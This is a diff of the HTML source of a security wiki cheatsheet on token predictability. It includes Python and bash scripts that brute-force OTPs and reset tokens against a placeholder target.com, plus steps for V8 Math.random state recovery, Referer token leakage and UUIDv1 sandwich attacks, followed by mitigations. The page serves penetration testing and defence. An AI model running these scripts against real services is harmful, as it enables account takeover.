-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span> itertools<span style="color:#f92672">,</span> string
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests<span style="color:#f92672">,</span> itertools<span style="color:#f92672">,</span> string
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># 6-digit numeric OTP — 1,000,000 combinations</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> otp <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">1000000</span>):
@@ -1463,101 +1428,80 @@ done
 </span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;https://target.com/confirm?token=</span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;confirmed&#39;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
 </span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[HIT] </span><span style="color:#e6db74">{</span>token<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
-</span></span></code></pre></div><p>Token entropy quick reference:</p>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span></span></span></code></pre></div><p>Token entropy quick reference:</p>
 <pre tabindex="0"><code>6-digit numeric:          ~20 bits — brute-forceable in seconds
 8-char alphanumeric:      ~41 bits — feasible with no rate limiting
 16-char alphanumeric:     ~83 bits — acceptable minimum
-32-byte CSPRNG (hex):     256 bits — secure
-</code></pre><h3 id="5-seed-recovery-from-observed-output-javascript-mathrandom">
-  5. Seed Recovery from Observed Output (JavaScript Math.random)
-  <a class="anchor" href="#5-seed-recovery-from-observed-output-javascript-mathrandom">#</a>
-</h3>
+32-byte CSPRNG (hex):     256 bits — secure</code></pre><h3 id="5-seed-recovery-from-observed-output-javascript-mathrandom">5. Seed Recovery from Observed Output (JavaScript Math.random)<a class="anchor" href="#5-seed-recovery-from-observed-output-javascript-mathrandom">#</a></h3>
 <p><code>Math.random()</code> in V8 uses xorshift128+ — state is 128 bits but observable outputs can be used to reconstruct internal state. Practical note: V8 refills a pool of 64 values at a time and returns them in <strong>reverse</strong> order, so account for this when correlating observed outputs to solver-recovered state.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Weak token generation — never do this
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">random</span>().<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">36</span>).<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">2</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#75715e">// Weak token generation — never do this
+</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">token</span> <span style="color:#f92672">=</span> Math.<span style="color:#a6e22e">random</span>().<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">36</span>).<span style="color:#a6e22e">substr</span>(<span style="color:#ae81ff">2</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">// If multiple Math.random() outputs are observable (e.g. exposed in API responses,
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">// cookies, or error messages), tools like `z3` or pre-built V8 state solvers
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// can reconstruct the full PRNG state and predict future outputs.
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Tool: https://github.com/PwnFunction/v8-randomness-predictor</span>
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">// can reconstruct the full PRNG state and predict future outputs.</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Tool: https://github.com/PwnFunction/v8-randomness-predictor</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Feed 5 observed Math.random() outputs into the Python script to recover internal state</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Collect samples first:</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#   Array.from(Array(5), Math.random)  ← run in Node/Chrome console</span>
 </span></span><span style="display:flex;"><span>python3 main.py  <span style="color:#75715e"># edit sequence = [...] in the script with your observed values</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Outputs recovered se_state0 / se_state1 → next Math.random() value predicted</span>
-</span></span></code></pre></div><h3 id="6-token-leakage-via-referer-header">
-  6. Token Leakage via Referer Header
-  <a class="anchor" href="#6-token-leakage-via-referer-header">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Outputs recovered se_state0 / se_state1 → next Math.random() value predicted</span></span></span></code></pre></div><h3 id="6-token-leakage-via-referer-header">6. Token Leakage via Referer Header<a class="anchor" href="#6-token-leakage-via-referer-header">#</a></h3>
 <p>Password reset tokens embedded in URLs <em>can</em> leak to third-party sites via the <code>Referer</code> header when the user clicks an external link from the reset page. <strong>Precondition:</strong> since Chrome 85 (Aug 2020) and Firefox 87 (Mar 2021), the default <code>Referrer-Policy</code> is <code>strict-origin-when-cross-origin</code>, which strips the path and query string on cross-origin requests — so the token no longer leaks by default. This works only when the reset page sets a permissive policy (<code>unsafe-url</code>, <code>no-referrer-when-downgrade</code>, <code>origin-when-cross-origin</code>), leaks to an attacker-controlled resource, or the victim runs an old browser. Keeping tokens out of URLs is still correct regardless.</p>
 <pre tabindex="0"><code>Attack flow:
 1. Request password reset → receive link: https://target.com/reset?token=abc123
 2. User clicks reset link, lands on reset page
 3. Reset page contains external resource (image, script, analytics)
 4. Browser sends: Referer: https://target.com/reset?token=abc123 to third-party
-5. Attacker-controlled third party or logs capture the token
-</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Check if reset token is in the URL (vs POST body or hidden field)</span>
+5. Attacker-controlled third party or logs capture the token</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Check if reset token is in the URL (vs POST body or hidden field)</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># If in URL → test Referer leakage by placing an external link on the page</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Intercept outgoing requests from the reset page in Burp</span>
-</span></span></code></pre></div><h3 id="test-cases">
-  Test Cases
-  <a class="anchor" href="#test-cases">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Intercept outgoing requests from the reset page in Burp</span></span></span></code></pre></div><h3 id="test-cases">Test Cases<a class="anchor" href="#test-cases">#</a></h3>
 <table>
-<thead>
-<tr>
-<th>Scenario</th>
-<th>Action</th>
-<th>Expected Outcome</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>UUID Version Check</td>
-<td>Inspect token format — M field = 1</td>
-<td>UUIDv1 confirmed → sandwich attack applicable</td>
-</tr>
-<tr>
-<td>Sequential Token</td>
-<td>Request 3 resets; compare token values</td>
-<td>Incremental pattern = enumeration possible</td>
-</tr>
-<tr>
-<td>Entropy Analysis</td>
-<td>Collect 2,000+ tokens (10k–20k for a thorough result); run Burp Sequencer</td>
-<td>Low randomness score = predictable PRNG</td>
-</tr>
-<tr>
-<td>Short Token Brute Force</td>
-<td>6-digit OTP with no rate limit</td>
-<td>1M attempts feasible; hit within minutes-to-hours depending on request throughput</td>
-</tr>
-<tr>
-<td>Timestamp Seed</td>
-<td>Note reset request time; run php_mt_seed</td>
-<td>Seed recovered → victim token generated</td>
-</tr>
-<tr>
-<td>Referer Leakage</td>
-<td>Request reset; visit external link from reset page</td>
-<td>Token appears in Referer header (only under a permissive Referrer-Policy)</td>
-</tr>
-<tr>
-<td>Math.random Token</td>
-<td>Observe multiple tokens from same session</td>
-<td>V8 state recovery → future tokens predicted</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Scenario</th>
+					<th>Action</th>
+					<th>Expected Outcome</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>UUID Version Check</td>
+					<td>Inspect token format — M field = 1</td>
+					<td>UUIDv1 confirmed → sandwich attack applicable</td>
+			</tr>
+			<tr>
+					<td>Sequential Token</td>
+					<td>Request 3 resets; compare token values</td>
+					<td>Incremental pattern = enumeration possible</td>
+			</tr>
+			<tr>
+					<td>Entropy Analysis</td>
+					<td>Collect 2,000+ tokens (10k–20k for a thorough result); run Burp Sequencer</td>
+					<td>Low randomness score = predictable PRNG</td>
+			</tr>
+			<tr>
+					<td>Short Token Brute Force</td>
+					<td>6-digit OTP with no rate limit</td>
+					<td>1M attempts feasible; hit within minutes-to-hours depending on request throughput</td>
+			</tr>
+			<tr>
+					<td>Timestamp Seed</td>
+					<td>Note reset request time; run php_mt_seed</td>
+					<td>Seed recovered → victim token generated</td>
+			</tr>
+			<tr>
+					<td>Referer Leakage</td>
+					<td>Request reset; visit external link from reset page</td>
+					<td>Token appears in Referer header (only under a permissive Referrer-Policy)</td>
+			</tr>
+			<tr>
+					<td>Math.random Token</td>
+					<td>Observe multiple tokens from same session</td>
+					<td>V8 state recovery → future tokens predicted</td>
+			</tr>
+	</tbody>
 </table>
-<h2 id="detection-techniques-offensive-perspective">
-  Detection Techniques (Offensive Perspective)
-  <a class="anchor" href="#detection-techniques-offensive-perspective">#</a>
-</h2>
-<h3 id="manual-detection--identifying-weak-tokens">
-  Manual Detection — Identifying Weak Tokens
-  <a class="anchor" href="#manual-detection--identifying-weak-tokens">#</a>
-</h3>
+<h2 id="detection-techniques-offensive-perspective">Detection Techniques (Offensive Perspective)<a class="anchor" href="#detection-techniques-offensive-perspective">#</a></h2>
+<h3 id="manual-detection--identifying-weak-tokens">Manual Detection — Identifying Weak Tokens<a class="anchor" href="#manual-detection--identifying-weak-tokens">#</a></h3>
 <p><strong>Pattern Recognition</strong></p>
 <pre tabindex="0"><code>Collect 5–10 tokens from the same endpoint and compare:
 
@@ -1570,33 +1514,26 @@ Reset 2: 1704067205_b1c9
 Reset 1: 6b894ab2-845d-11ee   → UUIDv1 (M=1) — vulnerable
 Reset 2: 6b89a4c6-845d-11ee   → minimal delta = sandwich attack feasible
 
-Reset 1: f3a9c12e8b4d7f2a...  → high variance, no pattern — likely secure
-</code></pre><p><strong>UUID Version Identification</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Extract version nibble from UUID token</span>
+Reset 1: f3a9c12e8b4d7f2a...  → high variance, no pattern — likely secure</code></pre><p><strong>UUID Version Identification</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Extract version nibble from UUID token</span>
 </span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;6b894ab2-845d-11ee-8227-00155d4e2cec&#34;</span> | cut -d<span style="color:#e6db74">&#39;-&#39;</span> -f3 | cut -c1
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Output: 1 → UUIDv1 (vulnerable)</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output: 4 → UUIDv4 (safe)</span>
-</span></span></code></pre></div><p><strong>Entropy Check — Token Length &amp; Character Space</strong></p>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Output: 4 → UUIDv4 (safe)</span></span></span></code></pre></div><p><strong>Entropy Check — Token Length &amp; Character Space</strong></p>
 <pre tabindex="0"><code>Token length &lt; 16 chars             → likely insufficient entropy
 Numeric only (e.g., 6-digit OTP)    → max 20 bits — brute-forceable
-Base64 / hex, 16+ chars, no pattern → likely CSPRNG
-</code></pre><h3 id="automated-detection">
-  Automated Detection
-  <a class="anchor" href="#automated-detection">#</a>
-</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Collect 100 tokens from password reset endpoint</span>
+Base64 / hex, 16+ chars, no pattern → likely CSPRNG</code></pre><h3 id="automated-detection">Automated Detection<a class="anchor" href="#automated-detection">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Collect 100 tokens from password reset endpoint</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">1</span> 100<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span>
 </span></span><span style="display:flex;"><span>  curl -s -X POST https://target.com/forgot-password <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -d <span style="color:#e6db74">&#34;email=attacker+</span>$i<span style="color:#e6db74">@test.com&#34;</span> <span style="color:#ae81ff">\
-</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -c /dev/null | grep -oP <span style="color:#e6db74">&#39;token=[^&#34;&amp;\s]+&#39;</span> | cut -d<span style="color:#f92672">=</span> -f2
+</span></span></span><span style="display:flex;"><span>    -d <span style="color:#e6db74">&#34;email=attacker+</span>$i<span style="color:#e6db74">@test.com&#34;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span>    -c /dev/null | grep -oP <span style="color:#e6db74">&#39;token=[^&#34;&amp;\s]+&#39;</span> | cut -d<span style="color:#f92672">=</span> -f2
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> &gt; tokens.txt
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Check for sequential patterns</span>
 </span></span><span style="display:flex;"><span>sort tokens.txt | uniq | awk <span style="color:#e6db74">&#39;NR&gt;1{if($0-prev==1)print &#34;SEQUENTIAL: &#34;$0}{prev=$0}&#39;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Feed into Burp Sequencer (live capture or manual load) for statistical analysis</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Significant bits &lt; 64 → weak; &lt; 32 → critical</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Measure token entropy</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Significant bits &lt; 64 → weak; &lt; 32 → critical</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Measure token entropy</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> math<span style="color:#f92672">,</span> collections
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">entropy</span>(token):
@@ -1607,8 +1544,7 @@ Base64 / hex, 16+ chars, no pattern → likely CSPRNG
 </span></span><span style="display:flex;"><span>tokens <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;tokens.txt&#39;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>splitlines()
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> t <span style="color:#f92672">in</span> tokens:
 </span></span><span style="display:flex;"><span>    e <span style="color:#f92672">=</span> entropy(t)
-</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>t[:<span style="color:#ae81ff">20</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">... entropy=</span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">:</span><span style="color:#e6db74">.2f</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39;[WEAK]&#39;</span> <span style="color:#66d9ef">if</span> e <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3.5</span> <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;[OK]&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Decode UUIDv1 timestamp and node (MAC) — no install required, stdlib only</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>t[:<span style="color:#ae81ff">20</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">... entropy=</span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">:</span><span style="color:#e6db74">.2f</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span><span style="color:#e6db74">&#39;[WEAK]&#39;</span> <span style="color:#66d9ef">if</span> e <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3.5</span> <span style="color:#66d9ef">else</span> <span style="color:#e6db74">&#39;[OK]&#39;</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Decode UUIDv1 timestamp and node (MAC) — no install required, stdlib only</span>
 </span></span><span style="display:flex;"><span>import uuid, datetime
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>u <span style="color:#f92672">=</span> uuid.UUID<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;6b894ab2-845d-11ee-8227-00155d4e2cec&#34;</span><span style="color:#f92672">)</span>
@@ -1618,11 +1554,7 @@ Base64 / hex, 16+ chars, no pattern → likely CSPRNG
 </span></span><span style="display:flex;"><span>unix_ts <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>u.time - 0x01b21dd213814000<span style="color:#f92672">)</span> / 1e7
 </span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span>f<span style="color:#e6db74">&#34;Timestamp: {datetime.datetime.utcfromtimestamp(unix_ts)} UTC&#34;</span><span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span>f<span style="color:#e6db74">&#34;Node/MAC : {&#39;:&#39;.join(f&#39;{(u.node &gt;&gt; i) &amp; 0xff:02x}&#39; for i in (40,32,24,16,8,0))}&#34;</span><span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Version=1 + visible MAC = sandwich attack confirmed feasible</span>
-</span></span></code></pre></div><h2 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h2>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Version=1 + visible MAC = sandwich attack confirmed feasible</span></span></span></code></pre></div><h2 id="impact">Impact<a class="anchor" href="#impact">#</a></h2>
 <ul>
 <li><strong>Account Takeover (ATO)</strong> — Predict or brute-force password reset token → reset victim&rsquo;s password without inbox access</li>
 <li><strong>Session Hijacking</strong> — Predict valid session ID → authenticate as victim without credentials</li>
@@ -1631,52 +1563,46 @@ Base64 / hex, 16+ chars, no pattern → likely CSPRNG
 <li><strong>Mass Account Compromise</strong> — Sequential tokens allow iterating through all user reset tokens systematically</li>
 <li><strong>Authentication Bypass</strong> — Predict OTP or email verification code → skip verification step entirely</li>
 </ul>
-<h2 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools">Tools<a class="anchor" href="#tools">#</a></h2>
 <table>
-<thead>
-<tr>
-<th>Tool</th>
-<th>Purpose</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Burp Sequencer</td>
-<td>Statistical entropy analysis of collected token samples</td>
-</tr>
-<tr>
-<td>Caido Sequencer (community plugin)</td>
-<td>Token randomness analysis with scoring and pattern detection</td>
-</tr>
-<tr>
-<td>php_mt_seed</td>
-<td>Recover PHP <code>mt_rand()</code> seed from observed output</td>
-</tr>
-<tr>
-<td>guidtool</td>
-<td>Decode UUIDv1 timestamp and MAC address</td>
-</tr>
-<tr>
-<td>hashcat</td>
-<td>Brute-force short or hashed tokens</td>
-</tr>
-<tr>
-<td>ffuf / Burp Intruder</td>
-<td>Enumerate token space against reset / verify endpoints</td>
-</tr>
-<tr>
-<td>interactsh</td>
-<td>Catch Referer-leaked tokens via out-of-band HTTP listener</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Tool</th>
+					<th>Purpose</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Burp Sequencer</td>
+					<td>Statistical entropy analysis of collected token samples</td>
+			</tr>
+			<tr>
+					<td>Caido Sequencer (community plugin)</td>
+					<td>Token randomness analysis with scoring and pattern detection</td>
+			</tr>
+			<tr>
+					<td>php_mt_seed</td>
+					<td>Recover PHP <code>mt_rand()</code> seed from observed output</td>
+			</tr>
+			<tr>
+					<td>guidtool</td>
+					<td>Decode UUIDv1 timestamp and MAC address</td>
+			</tr>
+			<tr>
+					<td>hashcat</td>
+					<td>Brute-force short or hashed tokens</td>
+			</tr>
+			<tr>
+					<td>ffuf / Burp Intruder</td>
+					<td>Enumerate token space against reset / verify endpoints</td>
+			</tr>
+			<tr>
+					<td>interactsh</td>
+					<td>Catch Referer-leaked tokens via out-of-band HTTP listener</td>
+			</tr>
+	</tbody>
 </table>
-<h2 id="mitigation--prevention">
-  Mitigation &amp; Prevention
-  <a class="anchor" href="#mitigation--prevention">#</a>
-</h2>
+<h2 id="mitigation--prevention">Mitigation &amp; Prevention<a class="anchor" href="#mitigation--prevention">#</a></h2>
 <ol>
 <li><strong>Use CSPRNGs</strong> — <code>random_bytes()</code> (PHP), <code>secrets</code> module (Python), <code>SecureRandom</code> (Java), <code>crypto.randomBytes()</code> (Node.js) — never <code>mt_rand()</code>, <code>rand()</code>, or <code>Math.random()</code> for security tokens</li>
 <li><strong>Minimum Token Entropy</strong> — NIST SP 800-63B sets a floor of <strong>64 bits of entropy</strong> for session secrets; the <strong>128-bit</strong> figure is OWASP&rsquo;s <em>length</em> recommendation (≈64 bits effective entropy under hex encoding). For tokens, generate at least <strong>128 bits of raw CSPRNG output</strong> (256 for long-lived tokens) as a conservative margin.</li>
@@ -1686,19 +1612,13 @@ Base64 / hex, 16+ chars, no pattern → likely CSPRNG
 <li><strong>Tokens in POST Body / Headers</strong> — Never embed security tokens in URLs to prevent Referer header leakage</li>
 <li><strong>Rate Limit Token Endpoints</strong> — Prevent brute-force of short tokens on reset and OTP verification endpoints</li>
 </ol>
-<h2 id="good-to-read">
-  Good To Read
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
+<h2 id="good-to-read">Good To Read<a class="anchor" href="#good-to-read">#</a></h2>
 <ul>
 <li><a href="https://hackerone.com/reports/1092831" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/1092831</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://hackerone.com/reports/273560" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/273560</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://dev.to/mohamed_aboelkheir/lessons-learned-3-is-your-random-uuid-really-random-account-takeover-with-the-sandwich-attack-4c1n" target="_blank" rel="noreferrer noopener nofollow">https://dev.to/mohamed_aboelkheir/lessons-learned-3-is-your-random-uuid-really-random-account-takeover-with-the-sandwich-attack-4c1n</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 </ul>
-<h2 id="references">
-  References
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References<a class="anchor" href="#references">#</a></h2>
 <ul>
 <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/README" target="_blank" rel="noreferrer noopener nofollow">OWASP Web Security Testing Guide — Weak Cryptography (WSTG-CRYP) and Session Management (WSTG-SESS)</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html" target="_blank" rel="noreferrer noopener nofollow">OWASP Session Management Cheat Sheet</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -1718,49 +1638,62 @@ Base64 / hex, 16+ chars, no pattern → likely CSPRNG
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/Token%20Predictability%20Issues%20Cheatsheet.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/Third-party-service-integration-issues/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Third party service integration issues</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Unrestricted-Resource-Consumption/" class="flex align-center">
+        <span>Unrestricted Resource Consumption</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -1801,15 +1734,24 @@ Base64 / hex, 16+ chars, no pattern → likely CSPRNG
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
